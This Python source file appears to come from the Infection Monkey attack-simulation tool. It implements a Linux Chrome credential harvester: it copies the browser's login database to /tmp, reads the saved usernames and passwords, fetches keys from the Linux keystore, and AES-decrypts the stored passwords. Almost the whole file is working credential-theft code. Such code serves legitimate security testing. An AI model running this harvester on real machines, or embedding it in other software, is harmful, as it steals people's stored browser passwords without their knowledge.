from typing import Collection
import logging
import os
import shutil
import sqlite3
from itertools import chain
from pathlib import Path, PurePath
from typing import Iterator, Optional

from common.credentials import Credentials, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .decrypt import decrypt_AES, decrypt_v80
from .linux_keystore import get_decryption_keys_from_storage


logger = logging.getLogger(__name__)

AES_BLOCK_SIZE = 16
AES_INIT_VECTOR = b" " * 16
DB_TEMP_PATH = "/tmp/chrome.db"
DB_SQL_STATEMENT = "SELECT username_value,password_value FROM logins"


class LinuxCredentialsDatabaseProcessor:
    def __init__(self):
        pass

    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        self._decryption_keys = [key for key in get_decryption_keys_from_storage()]
        credentials = chain.from_iterable(map(self._process_database_path, database_paths))
        return list(interruptible_iter(credentials, interrupt))

    def _process_database_path(self, database_path: PurePath) -> Iterator[Credentials]:
        path = Path(database_path)
        if path.is_file():
            try:
                shutil.copyfile(path, DB_TEMP_PATH)

                conn = sqlite3.connect(DB_TEMP_PATH)
            except Exception:
                logger.exception(f"Error encounter while connecting to database: {path}")
                os.remove(DB_TEMP_PATH)
                return

            try:
                yield from self._process_login_data(conn)
            except Exception:
                logger.exception(f"Error encountered while processing database {database_path}")
            finally:
                conn.close()

            os.remove(DB_TEMP_PATH)

    def _process_login_data(self, connection: sqlite3.Connection) -> Iterator[Credentials]:
        for user, password in connection.execute(DB_SQL_STATEMENT):
            try:
                yield Credentials(
                    identity=Username(username=user), secret=self._get_password(password)
                )
            except Exception:
                continue

    def _get_password(self, password: str) -> Optional[Password]:
        if self._password_is_encrypted(password):
            try:
                return Password(password=self._decrypt_password(password))
            except Exception:
                return None

        return Password(password=password)

    def _password_is_encrypted(self, password: str):
        return password[:3] == b"v10" or password[:3] == b"v11"

    def _decrypt_password(self, password: str) -> str:
        try:
            for key in self._decryption_keys:
                return self._chrome_decrypt(password, key, init_vector=AES_INIT_VECTOR)

        except Exception:
            logger.exception("Failed to decrypt password")
            raise

        # If we get here, we failed to decrypt the password
        raise Exception("Password could not be decrypted.")

    def _chrome_decrypt(self, encrypted_value, key, init_vector):
        try:
            return decrypt_AES(encrypted_value, key, init_vector, AES_BLOCK_SIZE)
        except UnicodeDecodeError:
            return decrypt_v80(encrypted_value, key)

    def _remove_padding(self, data):
        """
        Remove PKCS#7 padding
        """
        nb = data[-1]

        try:
            return data[:-nb]
        except Exception as err:
            logger.debug(err)
            return data
